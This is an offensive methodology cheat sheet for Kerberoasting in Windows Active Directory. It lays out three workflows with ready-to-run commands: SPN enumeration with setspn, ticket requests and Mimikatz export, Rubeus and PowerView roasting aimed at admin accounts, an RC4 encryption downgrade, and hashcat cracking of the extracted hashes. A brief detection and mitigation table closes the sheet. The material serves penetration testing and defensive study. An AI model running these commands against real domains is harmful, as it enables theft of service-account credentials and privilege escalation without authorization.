# Kerberoasting Methodology & Tooling

### Scenario Context

**Kerberoasting** is a post-exploitation technique used to steal **Kerberos TGS tickets** for service accounts to crack their passwords offline. This is effective because service account passwords are often weak or rarely changed.

---

### Workflow 1: Manual Windows Extraction (setspn + Mimikatz)

**When to use:** Use when automated tools are blocked by security software or when a manual, stealthier approach is required.

1. **Enumerate SPNs:** Identify service accounts in the domain.
2. **Request TGS Ticket:** Load the ticket for a specific service account into the current session's memory.
3. **Export Tickets:** Use Mimikatz to extract the loaded tickets from memory as base64 blobs or `.kirbi` files.
4. **Prepare for Cracking:** Convert the extracted ticket into a format compatible with Hashcat.

#### Command Reference: Manual Kerberoasting

|Tool|Command|Purpose|
|:--|:--|:--|
|**setspn.exe**|`-Q */*`|**Enumerates** all Service Principal Names (SPNs) in the domain.|
|**PowerShell**|`Add-Type -AssemblyName System.IdentityModel`|Loads the necessary assembly to request Kerberos tokens.|
|**PowerShell**|`New-Object ... -ArgumentList "<TARGET_SPN>"`|**Requests** a TGS ticket for a specific SPN into memory.|
|**Mimikatz**|`kerberos::list /export`|**Extracts** all Kerberos tickets from memory to disk.|

**Execution:**

```
# 1. Enumerate and request ticket for a specific SPN
setspn.exe -Q */*
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SERVICE>/<TARGET_NAME>.<DOMAIN>:1433"

# 2. Extract from memory using Mimikatz
mimikatz.exe "base64 /out:true" "kerberos::list /export" "exit"
```

---

### Workflow 2: Automated Extraction (PowerView & Rubeus)

**When to use:** Use for efficiency in time-boxed assessments. PowerView is ideal for exporting to CSV, while Rubeus is the fastest and most versatile tool for large-scale roasting.

1. **Analyze Environment Stats:** Use Rubeus to see how many accounts are "roastable" and their encryption types.
2. **Target High-Value Accounts:** Focus on accounts with `admincount=1` as they likely have elevated privileges.
3. **Perform the Roast:** Extract the hashes directly to the terminal or a file.

#### Command Reference: Tool-Based Kerberoasting

|Tool|Command / Flag|Purpose|
|:--|:--|:--|
|**PowerView**|`Get-DomainUser -Identity \|Get-DomainSPNTicket -Format Hashcat`|
|**Rubeus**|`kerberoast /stats`|Provides **statistics** on roastable users without requesting tickets.|
|**Rubeus**|`kerberoast /ldapfilter:'admincount=1' /nowrap`|Targets only **administrative accounts** and prevents line wrapping.|
|**Rubeus**|`kerberoast /tgtdeleg`|**Downgrades** encryption to RC4 for faster cracking (pre-Server 2019).|

**Execution:**

```
# PowerView: Export all SPN tickets to Hashcat format in a CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<FILENAME>.csv -NoTypeInformation

# Rubeus: Targeted roast of administrative accounts
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

---

### Workflow 3: Offline Hash Preparation & Cracking

**When to use:** Perform on the attack machine after successfully extracting ticket blobs or files.

1. **Format Blob:** If using manual base64 output, remove newlines and decode.
2. **Extract Hash:** Use `kirbi2john.py` to pull the crackable hash from the `.kirbi` file.
3. **Convert for Hashcat:** Use `sed` to reformat the John output into a Hashcat-compatible string.
4. **Crack:** Run Hashcat against the prepared hash.

#### Command Reference: Cracking

|Tool|Mode|Description|
|:--|:--|:--|
|**Hashcat**|`-m 13100`|Used for **RC4** (etype 23) Kerberos 5 TGS-REP hashes.|
|**Hashcat**|`-m 19700`|Used for **AES-256** (etype 18) Kerberos 5 TGS-REP hashes.|

**Execution:**

```
# 1. Convert .kirbi to Hashcat format
python2.7 kirbi2john.py <FILE>.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$ \2/' crack_file > <TARGET>_hashcat

# 2. Crack RC4 hash
hashcat -m 13100 <TARGET>_hashcat /usr/share/wordlists/rockyou.txt

# 3. Crack AES-256 hash
hashcat -m 19700 <TARGET>_aes_hash /usr/share/wordlists/rockyou.txt
```

---

### Encryption Vulnerabilities & Downgrades

|Configuration|Implication|
|:--|:--|
|**RC4 (etype 23)**|Significantly faster to crack than AES; often the default in older domains.|
|**AES-256 (etype 18)**|Much slower to crack; default for **Windows Server 2019** DCs.|
|**Downgrade Attack**|The `/tgtdeleg` flag in Rubeus forces RC4 encryption on Server 2016 or earlier, even if AES is enabled.|

**Edge Case:** The `/tgtdeleg` downgrade **does not work** against Windows Server 2019 Domain Controllers; they will always return the highest supported encryption level.

---

### Detection and Mitigations

|Event ID / Setting|Description|
|:--|:--|
|**Event ID 4769**|Logged when a Kerberos service ticket is requested. High volumes from one account indicate an attack.|
|**Encryption 0x17**|Hex for RC4; seeing this in logs for service requests is a strong indicator of roasting.|
|**GPO: Audit Kerberos**|Must be enabled ("Audit Kerberos Service Ticket Operations") to generate the necessary logs.|
|**MSA / gMSA**|**Managed Service Accounts** use complex, auto-rotating passwords, effectively neutralizing roasting.|